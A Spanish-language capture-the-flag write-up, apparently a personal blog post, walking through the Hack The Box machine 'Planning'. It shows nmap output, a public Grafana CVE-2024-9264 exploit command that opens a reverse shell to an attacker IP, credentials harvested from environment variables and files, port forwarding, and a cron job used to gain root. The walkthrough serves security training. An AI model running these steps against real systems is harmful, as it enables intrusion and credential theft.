---
layout: post
title: "Planning"
date: 2026-01-23 00:00:00 +0100
tags: ["Docker", "CVE", "Crontab"]
os: "Linux"
level: "Easy"
image: "https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/c9efb253e7d1d9b407113e11afdaa905.png"
---

La maquina provee la siguiente información:
> *As is common in real life pentests, you will start the Planning box with credentials for the following account: admin / 0D5oT70Fq13EvB5r*

Enumeración de puertos
```java
sudo nmap -sC -sV -p22,80 -Pn -n --open planning.htb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-13 18:53 CEST
Nmap scan report for planning.htb (10.10.11.68)
Host is up (0.050s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Edukate - Online Education Website
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.86 seconds
```

Enumeración de directorios

![](/assets/machines/planning.htb/images/8e40da79-d9ca-4dc3-bb38-36e09ce4b1ca.webp)

Iniciar sesión en Grafana.

![](/assets/machines/planning.htb/images/267ab6b4-80b4-4d4b-906f-374e434236a7.webp)

Versión Grafana.

![](/assets/machines/planning.htb/images/e435d4ce-0b02-4575-aa34-fae0b590ccc8.webp)

La versión de grafana v11.0.0 es vulnerable al CVE-2024-9264.

> [z3k0sec/CVE-2024-9264-RCE-Exploit: Grafana RCE exploit (CVE-2024-9264)](https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit?tab=readme-ov-file#description)

Establecer una reverse shell.

```bash
$ python poc.py --url http://grafana.planning.htb --username admin --password 0D5oT70Fq13EvB5r --reverse-ip 10.10.14.115 --reverse-port 9000
[SUCCESS] Login successful!
Reverse shell payload sent successfully!
Set up a netcat listener on 9000
```

![](/assets/machines/planning.htb/images/b7430bce-3ee9-4489-97a1-794ac8718c8c.webp)

Una vez dentro somos ``root`` pero de un contenedor de Docker.

Contraseña encontrada: `RioTecRANDEntANT!` usando el comando `env`.

![](/assets/machines/planning.htb/images/3a16ac13-832d-41bb-be0a-c03d5ee13168.webp)

Usamos las credenciales `enzo:RioTecRANDEntANT!` para iniciar sesión por SSH.

El fichero `/var/www/web/enroll.php` contiene las credenciales root para la base de datos `root:EXTRapHY`. Pero no nos van a servir para nada.

![](/assets/machines/planning.htb/images/ff134108-abbf-4038-b140-d39fbf1fe3d5.webp)

Por otra parte, en `/opt/crontabs/crontab.db` encontraremos unas credenciales `P4ssw0rdS0pRi0T3c`.

![](/assets/machines/planning.htb/images/a790ec0f-1ba0-4261-98d0-65bc9820455b.webp)

Hay un puerto 8000 abierto.

![](/assets/machines/planning.htb/images/5bda233d-b920-481c-87cd-a0223bc00c19.webp)

Usar Port Forwarding para llegar al puerto 8000 desde la la máquina atacante.

![](/assets/machines/planning.htb/images/329b9d64-5afb-4560-b010-a30f2a06ae3b.webp)

Iniciar sesión con las credenciales `root:P4ssw0rdS0pRi0T3c`.

![](/assets/machines/planning.htb/images/ba2c5997-137c-4fb3-a484-f2b5294773ae.webp)

Crear un job con una reverse shell.

![](/assets/machines/planning.htb/images/bbadb00b-1742-4f5d-8ca2-e29ec5b09347.webp)

Clicar en "Run now".

![](/assets/machines/planning.htb/images/6c24f94f-77fe-4ca6-a582-db07b1672b4e.webp)

Obtemos el `root.txt`.

![](/assets/machines/planning.htb/images/07330cac-8ce0-4436-846b-171e903d55ec.webp)

¡Happy Hacking!